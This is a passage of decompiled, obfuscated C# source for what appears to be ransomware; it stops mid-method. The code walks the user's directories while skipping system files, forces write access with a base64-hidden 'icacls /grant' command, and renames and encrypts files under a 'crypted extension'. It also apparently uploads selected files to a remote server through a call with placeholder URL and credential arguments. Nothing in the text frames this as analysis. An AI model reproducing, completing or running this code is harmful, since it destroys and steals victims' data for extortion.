using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using kAAphfzOgRuTne;

namespace OeQGwjtftIBDg;

internal sealed class jSdbwwLMlbK
{
	public sealed class ZrSLResrnzoS
	{
		private static StringCollection YPlWDcVxDSqPlmg = new StringCollection();

		private static List<string> AOxhVPonGCAZxkQLW = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(aOUUGKAtMbj("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".xlat7j") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(eYxPrbivOxVq))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(ZevFDLuRwkwY) * 1024.0 * 1024.0 && dGKzCRKvbfM == "YES")
							{
								AOxhVPonGCAZxkQLW.Add(text);
							}
							else if (File.Exists(text) && dGKzCRKvbfM == "NO")
							{
								AOxhVPonGCAZxkQLW.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return AOxhVPonGCAZxkQLW;
		}
	}

	private sealed class yYibUCwpbDDsSQW
	{
		public string sNihvifarw;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == sNihvifarw;
		}
	}

	private sealed class JvcfwQzISk
	{
		private sealed class pfuYRChnJGm
		{
			public JvcfwQzISk VGqtMNfXpOeV;

			public string uDDfTynCYnjkk;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					CykKXkKREIJHAsWDcF(WindowsIdentity.GetCurrent().Name, uDDfTynCYnjkk);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				wyXEoxYgFlx(uDDfTynCYnjkk, VGqtMNfXpOeV.rhGmYthDUQmUXY, VGqtMNfXpOeV.RSEJcjYBjVKvf, VGqtMNfXpOeV.hwmNyjCXlGa, VGqtMNfXpOeV.ISyoXQMaLcr);
			}
		}

		public string[] rhGmYthDUQmUXY;

		public string[] hwmNyjCXlGa;

		public string ISyoXQMaLcr;

		public string RSEJcjYBjVKvf;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			pfuYRChnJGm CS_0024_003C_003E8__locals0 = new pfuYRChnJGm();
			CS_0024_003C_003E8__locals0.VGqtMNfXpOeV = this;
			CS_0024_003C_003E8__locals0.uDDfTynCYnjkk = string_0;
			if (pKzqlEujtGte && !bZzwXTgSpki().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						CykKXkKREIJHAsWDcF(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.uDDfTynCYnjkk);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (UimcEmUUufACwj == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					wyXEoxYgFlx(CS_0024_003C_003E8__locals0.uDDfTynCYnjkk, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.rhGmYthDUQmUXY, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.RSEJcjYBjVKvf, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.hwmNyjCXlGa, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.ISyoXQMaLcr);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				wyXEoxYgFlx(CS_0024_003C_003E8__locals0.uDDfTynCYnjkk, rhGmYthDUQmUXY, RSEJcjYBjVKvf, hwmNyjCXlGa, ISyoXQMaLcr);
			}
		}
	}

	private sealed class NqgLGuiWzfCY
	{
		private sealed class pCEAcJSlihfT
		{
			public NqgLGuiWzfCY skojTCfpMTmBgaE;

			public string QYLLJdwFdzqpEK;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				try
				{
					if (WXNHDtRjOR)
					{
						Console.WriteLine("File in process: " + QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(QYLLJdwFdzqpEK).Length + " bytes");
						Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", RQEvWqwCwPPGRO.Count, RGcMmldgjxiBCQ, kAIRALERmvGYRk);
						Console.WriteLine("Time elapsed:  {0}", WnKvTcsQHPkFh.Elapsed);
						Console.WriteLine("----------------------------------------------------------------------------");
					}
				}
				catch
				{
				}
			}
		}

		private sealed class xsjOoqCFQXplGn
		{
			public pCEAcJSlihfT DdBxMAQkUzlA;

			public NqgLGuiWzfCY skojTCfpMTmBgaE;

			public string MjsOdLNSbnEbUw;

			public void _003CWorkerCrypter2_003Eb__2e()
			{
				foreach (string item in GkngOkBVtwXA)
				{
					if (MjsOdLNSbnEbUw.ToLower().EndsWith(item + skojTCfpMTmBgaE.iLLbyCvEDeENhQL) && kcuNJebGcjkOW == "YES")
					{
						if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > new FileInfo(MjsOdLNSbnEbUw).Length)
						{
							try
							{
								dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", MjsOdLNSbnEbUw);
							}
							catch
							{
							}
						}
					}
					else if (MjsOdLNSbnEbUw.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
					{
						try
						{
							dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", MjsOdLNSbnEbUw);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class hLwPTCoaDXFTRD
		{
			public NqgLGuiWzfCY skojTCfpMTmBgaE;

			public string QYLLJdwFdzqpEK;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				try
				{
					if (WXNHDtRjOR)
					{
						Console.WriteLine("File in process: " + QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(QYLLJdwFdzqpEK).Length + " bytes");
						Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", RQEvWqwCwPPGRO.Count, RGcMmldgjxiBCQ, kAIRALERmvGYRk);
						Console.WriteLine("Time elapsed:  {0}", WnKvTcsQHPkFh.Elapsed);
						Console.WriteLine("----------------------------------------------------------------------------");
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in GkngOkBVtwXA)
				{
					if (QYLLJdwFdzqpEK.ToLower().EndsWith(item + skojTCfpMTmBgaE.iLLbyCvEDeENhQL) && kcuNJebGcjkOW == "YES")
					{
						if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > new FileInfo(QYLLJdwFdzqpEK).Length)
						{
							try
							{
								dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", QYLLJdwFdzqpEK);
							}
							catch
							{
							}
						}
					}
					else if (QYLLJdwFdzqpEK.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
					{
						try
						{
							dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", QYLLJdwFdzqpEK);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> TbgrPwEdpnztCF;

		public List<string> bJYKLBcpDU;

		public string iLLbyCvEDeENhQL;

		public string[] ubOMKyMUqzMPH;

		public string zVjVWQkqZc;

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			using List<string>.Enumerator enumerator = bJYKLBcpDU.GetEnumerator();
			xsjOoqCFQXplGn CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				pCEAcJSlihfT CS_0024_003C_003E8__locals1 = new pCEAcJSlihfT();
				CS_0024_003C_003E8__locals1.skojTCfpMTmBgaE = this;
				CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK = enumerator.Current;
				if (ubOMKyMUqzMPH.Length != 0)
				{
					string[] array = ubOMKyMUqzMPH;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09f3;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK.EndsWith(iLLbyCvEDeENhQL))
					{
						goto IL_09f3;
					}
				}
				catch (Exception)
				{
					goto IL_09f3;
				}
				if (!CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK.EndsWith(string_0) || RQEvWqwCwPPGRO.Contains(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK))
				{
					continue;
				}
				if (mGDrzdnKDnvM == "YES")
				{
					try
					{
						if (jKkQUJosFPVdk.waTjtdDWNGqfzuC(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK))
						{
							jKkQUJosFPVdk.TMsATZeUtEjbUs(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
						}
					}
					catch
					{
					}
				}
				RQEvWqwCwPPGRO.Add(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (WXNHDtRjOR)
						{
							Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length + " bytes");
							Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", RQEvWqwCwPPGRO.Count, RGcMmldgjxiBCQ, kAIRALERmvGYRk);
							Console.WriteLine("Time elapsed:  {0}", WnKvTcsQHPkFh.Elapsed);
							Console.WriteLine("----------------------------------------------------------------------------");
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!uWeqxhASudz.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK)))
				{
					uWeqxhASudz.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK));
				}
				nPNwbmqRpAob(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
				try
				{
					new mbyhMxOviAa().HeFNHeFPXu(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (WXNHDtRjOR)
							{
								Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						BYWGmjrQxPOi(aOUUGKAtMbj("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + "\"" + aOUUGKAtMbj("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + aOUUGKAtMbj("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (NZZJwvuCaIyu)
					{
						try
						{
							File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (NZZJwvuCaIyu)
						{
							try
							{
								File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						kAIRALERmvGYRk++;
						goto end_IL_02e2;
					}
					if (mWVhKlhRjNKlia == "YES" && new FileInfo(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK).Length > Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024 && !TbgrPwEdpnztCF.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new xsjOoqCFQXplGn();
						CS_0024_003C_003E8__locals0.DdBxMAQkUzlA = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE = this;
						try
						{
							if (iLLbyCvEDeENhQL != ".*")
							{
								if (BSFTTffCPqVFY)
								{
									iLLbyCvEDeENhQL = XOTrqnPLqah + iLLbyCvEDeENhQL;
								}
								File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL);
							}
						}
						catch (Exception ex6)
						{
							if (NZZJwvuCaIyu)
							{
								try
								{
									File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							kAIRALERmvGYRk++;
							goto end_IL_02e2;
						}
						CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw = "";
						if (iLLbyCvEDeENhQL != ".*")
						{
							CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw = CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL;
						}
						else
						{
							CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw = CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK;
						}
						if (VjQPfxZAMTjUgJ == "YES")
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in GkngOkBVtwXA)
								{
									if (CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE.iLLbyCvEDeENhQL) && kcuNJebGcjkOW == "YES")
									{
										if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw).Length)
										{
											try
											{
												dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
									{
										try
										{
											dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = AuDAdFkipC.mPripbmHPhq(32);
						string s = LBIBcyVRyJsgY.EMWORkdaaqST(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (vcFnlphaWZwF == "NO")
						{
							byte[] array2 = null;
							byte[] byte_ = IuIIhDBsGDXt.dbNTPTvtWbWOCoG(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024);
							if (IuIIhDBsGDXt.dfpNpoHXtKEP(giNofYHUtqNeDrVh: (!GtQHtyUYTAIYOR) ? (cqwcNhPdCH ? IuIIhDBsGDXt.hzCfVwhNVmpN(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : IuIIhDBsGDXt.hzCfVwhNVmpN(byte_, Encoding.ASCII.GetBytes(zVjVWQkqZc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (cqwcNhPdCH ? KBdxgLGHgkeiH.XWZoHXBxnyxpF(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KBdxgLGHgkeiH.XWZoHXBxnyxpF(byte_, Encoding.ASCII.GetBytes(zVjVWQkqZc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DOYGxpRQSwJj: CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, DdudrgeqXqE: bytes))
							{
								goto IL_09f3;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
							}
							catch (Exception)
							{
							}
						}
						else if (!cqwcNhPdCH)
						{
							if (aPmKQJajtniGBkiL.giukCbhWyeyjClL(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, QwggfFbICMPoft, zVjVWQkqZc))
							{
								goto IL_09f3;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (aPmKQJajtniGBkiL.giukCbhWyeyjClL(CS_0024_003C_003E8__locals0.MjsOdLNSbnEbUw, QwggfFbICMPoft, text, bytes))
							{
								goto IL_09f3;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (BSFTTffCPqVFY)
					{
						iLLbyCvEDeENhQL = XOTrqnPLqah + iLLbyCvEDeENhQL;
					}
					string text2 = AuDAdFkipC.mPripbmHPhq(32);
					string s2 = LBIBcyVRyJsgY.EMWORkdaaqST(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (iLLbyCvEDeENhQL != ".*")
					{
						if (!xetcGCQIRoI)
						{
							if (!cqwcNhPdCH)
							{
								UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, WLkpdSTfqi);
							}
							else
							{
								UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!cqwcNhPdCH)
								{
									UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, WLkpdSTfqi);
								}
								else
								{
									UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (NZZJwvuCaIyu)
								{
									try
									{
										File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while fully writing to file: " + ex11.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								kAIRALERmvGYRk++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
								}
								catch (Exception)
								{
								}
								goto end_IL_02e2;
							}
						}
					}
					else if (!xetcGCQIRoI)
					{
						if (!cqwcNhPdCH)
						{
							UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + ".part", WLkpdSTfqi);
						}
						else
						{
							UzRQaROZaVQyO(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + ".part", Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!cqwcNhPdCH)
							{
								UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, WLkpdSTfqi);
							}
							else
							{
								UjAXoJppaj(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (NZZJwvuCaIyu)
							{
								try
								{
									File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + " - Error while fully writing to file: " + ex14.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							kAIRALERmvGYRk++;
							goto end_IL_02e2;
						}
					}
					if (cqwcNhPdCH)
					{
						if (iLLbyCvEDeENhQL != ".*")
						{
							MBaDCxnytAAU(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL, bytes2);
						}
						else
						{
							MBaDCxnytAAU(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK, bytes2);
						}
					}
					goto IL_09f3;
					end_IL_02e2:;
				}
				catch (Exception)
				{
					goto IL_09f3;
				}
				continue;
				IL_09f3:
				bJYKLBcpDU.Remove(CS_0024_003C_003E8__locals1.QYLLJdwFdzqpEK);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2f(string string_0)
		{
			hLwPTCoaDXFTRD CS_0024_003C_003E8__locals0 = new hLwPTCoaDXFTRD();
			CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE = this;
			CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK = string_0;
			if (ubOMKyMUqzMPH.Length != 0)
			{
				string[] array = ubOMKyMUqzMPH;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0978;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.EndsWith(iLLbyCvEDeENhQL))
				{
					goto IL_0978;
				}
			}
			catch (Exception)
			{
				goto IL_0978;
			}
			if (!RQEvWqwCwPPGRO.Contains(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK))
			{
				if (mGDrzdnKDnvM == "YES")
				{
					try
					{
						if (jKkQUJosFPVdk.waTjtdDWNGqfzuC(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK))
						{
							jKkQUJosFPVdk.TMsATZeUtEjbUs(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
						}
					}
					catch
					{
					}
				}
				RQEvWqwCwPPGRO.Add(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (WXNHDtRjOR)
						{
							Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length + " bytes");
							Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", RQEvWqwCwPPGRO.Count, RGcMmldgjxiBCQ, kAIRALERmvGYRk);
							Console.WriteLine("Time elapsed:  {0}", WnKvTcsQHPkFh.Elapsed);
							Console.WriteLine("----------------------------------------------------------------------------");
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!uWeqxhASudz.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK)))
				{
					uWeqxhASudz.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK));
				}
				nPNwbmqRpAob(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
				try
				{
					new mbyhMxOviAa().HeFNHeFPXu(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (WXNHDtRjOR)
							{
								Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						BYWGmjrQxPOi(aOUUGKAtMbj("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + "\"" + aOUUGKAtMbj("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + aOUUGKAtMbj("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (NZZJwvuCaIyu)
					{
						try
						{
							File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length != 0L)
						{
							goto end_IL_02af;
						}
						goto end_IL_02af_2;
						end_IL_02af:;
					}
					catch (Exception ex4)
					{
						if (NZZJwvuCaIyu)
						{
							try
							{
								File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						kAIRALERmvGYRk++;
						goto end_IL_02af_2;
					}
					if (mWVhKlhRjNKlia == "YES" && new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length > Convert.ToInt32(QwggfFbICMPoft) * 1024 * 1024)
					{
						try
						{
							if (iLLbyCvEDeENhQL != ".*")
							{
								if (BSFTTffCPqVFY)
								{
									iLLbyCvEDeENhQL = XOTrqnPLqah + iLLbyCvEDeENhQL;
								}
								File.Move(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + iLLbyCvEDeENhQL);
							}
						}
						catch (Exception ex6)
						{
							if (NZZJwvuCaIyu)
							{
								try
								{
									File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							kAIRALERmvGYRk++;
							return;
						}
						if (iLLbyCvEDeENhQL != ".*")
						{
							CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK += iLLbyCvEDeENhQL;
						}
						if (VjQPfxZAMTjUgJ == "YES")
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in GkngOkBVtwXA)
								{
									if (CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.skojTCfpMTmBgaE.iLLbyCvEDeENhQL) && kcuNJebGcjkOW == "YES")
									{
										if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK).Length)
										{
											try
											{
												dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
									{
										try
										{
											dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = AuDAdFkipC.mPripbmHPhq(32);
						string s = LBIBcyVRyJsgY.EMWORkdaaqST(text);
